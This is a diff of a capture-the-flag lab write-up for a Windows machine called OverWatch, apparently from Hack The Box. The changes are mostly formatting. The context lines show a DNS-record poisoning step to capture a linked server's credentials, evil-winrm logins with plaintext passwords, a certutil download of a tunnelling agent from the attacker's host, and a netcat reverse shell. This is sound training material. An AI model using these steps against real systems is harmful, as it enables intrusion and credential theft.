@@ -10,11 +10,13 @@ OverWatch
 
 Windows medium Machine 
 
->[!Mistake]
+>**Mistake**
 >- I didn't run full port scan (--min-rate -p-). 
 >- When i see the exe, I just download it, but i  missed the config files.
 >- While decompile the .exe files. Once i found password forgot to read code
 >- Use always use debug mode in tools
+{: .prompt-warning }
+
 
 
 Initial Nmap scan
@@ -226,7 +228,7 @@ SQL (OVERWATCH\sqlsvc  dbo@overwatch)>
 No Interesting data inside the mssql Tables, so i enumerate with options 
 
 
-```Bash
+```bash
 SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_impersonate
 execute as   database   permission_name   state_desc   grantee   grantor
 ----------   --------   ---------------   ----------   -------   -------
@@ -255,7 +257,7 @@ Linked Server   Local Login   Is Self Mapping   Remote Login
 Here i stucked After sometimes with help of @4ntsec i found links server concept and found one linked server. but that is  not reachable.
 
 
-```Bash
+```bash
 SQL (OVERWATCH\sqlsvc  guest@master)> SELECT * FROM OPENQUERY(SQL07, 'SELECT name FROM master..sysdatabases');
 INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
 INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
@@ -266,7 +268,7 @@ The Linked server response timeout due to<span style="color:rgb(0, 176, 240)"> D
 
 [Dnstool git repo](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) -- clone this repo and run this tool within the dir
 
-```Bash
+```bash
 orca:krbrelayx/ (master) $ python3 dnstool.py -u overwatch.htb\\sqlsvc -p 'TI0LKcfHzZw1Vv' --action add --record SQL07 --data 10.10.17.2 -dns-ip 10.129.244.81 overwatch.htb
 [-] Connecting to host...
 [-] Binding to host
@@ -289,7 +291,7 @@ orca:krbrelayx/ (master) $ python3 dnstool.py -u overwatch.htb\\sqlsvc -p 'TI0LK
 When trigger the Linked server
 
 Trigger
-```Bash
+```bash
 SQL (OVERWATCH\sqlsvc  guest@master)> SELECT * FROM OPENQUERY(SQL07, 'SELECT name FROM master..sysdatabases');
 INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
 ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.
@@ -319,7 +321,7 @@ WINRM       10.129.244.81   5985   S200401          [+] overwatch.htb\sqlmgmt:bI
 
 <span style="color:rgb(0, 255, 0)">User Flag</span>
 
-```Bash
+```bash
 orca:writeup/ $ evil-winrm -i 10.129.244.81  -u sqlmgmt -p 'bIhBbzMMnB82yx'                                                                                     [19:46:49]
 
 Evil-WinRM shell v3.5
@@ -341,7 +343,7 @@ Enumeration
 - Also config file got port and services
 - Run the lingolo and exploit
 
-```Bash
+```bash
 *Evil-WinRM* PS C:\Users\sqlmgmt\Documents> netstat -ano | findstr LISTENING
 TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       696
 TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       936
@@ -463,7 +465,7 @@ return "Error: " + ex.Message;
 
 Found  local port with directory name in overwatch.exe.config --> http://overwatch.htb:8000/MonitorService
 
-```Bash
+```bash
 orca:overwatch/ $ cat overwatch.exe.config                                                                                                                      [19:54:06]
 <?xml version="1.0" encoding="utf-8"?>
 <configuration>
@@ -513,6 +515,7 @@ Run Ligolo-ng #ligolo-ng
 - Download Ligolo agent and proxy 
 - Transfer agent file using wget or any tranfer method in windows
 - run python server and transfer
+
 ```bash
 *Evil-WinRM* PS C:\Users\sqlmgmt\Documents> certutil -urlcache -f -split http://10.10.17.2:8000/agent.exe
 ****  Online  ****
@@ -607,7 +610,8 @@ curl -X POST http://240.0.0.1:8000/MonitorService \
 with -v  you will see what will happen.
 
 Finally Got reverse shell
-```Bash
+
+```bash
 orca:writeup/ $ nc -lvnp 4444                                                                                                                                   [20:35:37]
 Listening on 0.0.0.0 4444
 Connection received on 10.129.244.81 61125
